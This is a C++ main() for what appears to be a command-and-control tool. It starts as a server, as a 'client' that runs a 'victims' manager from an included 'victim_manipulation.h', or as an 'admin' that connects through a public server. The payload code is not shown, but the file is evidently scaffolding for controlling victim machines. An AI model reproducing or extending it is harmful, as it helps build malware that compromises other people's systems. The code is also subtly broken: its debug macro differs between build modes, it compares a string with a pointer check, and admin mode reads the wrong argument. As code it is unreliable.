#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <iostream>
#include <ostream>
#include <string>

#include "client.h"
#include "manager.h"
#include "msg_parser.h"
#include "server.h"
#include "thread_pool.h"
#include "victim_manipulation.h"

#ifdef NDEBUG
#define PRINT(a, b)
#else
#define PRINT(a) std::cout << "[DEBUG]: " << (a) << std::endl;
#endif
#define ERROR(a) std::cerr << "[ERROR]: " << (a) << std::endl

#define SERVER_LOCAL_PORT_NUMBER 2772
#define SERVER_PUBLIC_PORT_NUMBER 3916
#define SERVER_IP ""

#define THREAD_NUM 12

enum ERROR_CODES {
	NO_EXECUTION_MODE = -1,
	MISSING_SERVER_PORT = -2,
	MISSING_LOCAL_PORT = -3,
};

namespace io = boost::asio;
int main(int argc, char* argv[]) {
	if (argc < 2) {
		ERROR("Mode of execution not specified!");
		return NO_EXECUTION_MODE;
	}

	if (std::string(argv[1]) == "server") {
		PRINT("Running as a server...")

		io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
		server tcp_server(io_context, SERVER_LOCAL_PORT_NUMBER);
		tcp_server.start();
		io_context.run();
		return 0;
	}

	if (SERVER_IP == "") {
		ERROR("Missing public server port!");
		return MISSING_SERVER_PORT;
	}
	if (argc < 3) {
		ERROR("Local port for client/admin not specified!");
		return MISSING_LOCAL_PORT;
	}

	if (std::string(argv[1]) == "client") {
		PRINT("Running as a client...")

		victims victims(THREAD_NUM, "", argv[2]);

		io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
		client client_tcp(io_context, atoi(argv[2]), SERVER_IP, SERVER_PUBLIC_PORT_NUMBER, &victims);
		client_tcp.start();
		io_context.run();
		return 0;
	}
	if (std::string(argv[1]) == "admin") {
		PRINT("Running as an admin...")

		io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
		manager admin_tcp(io_context, atoi(argv[1]), SERVER_IP, SERVER_PUBLIC_PORT_NUMBER);
		admin_tcp.start();
		io_context.run();
		return 0;
	}
}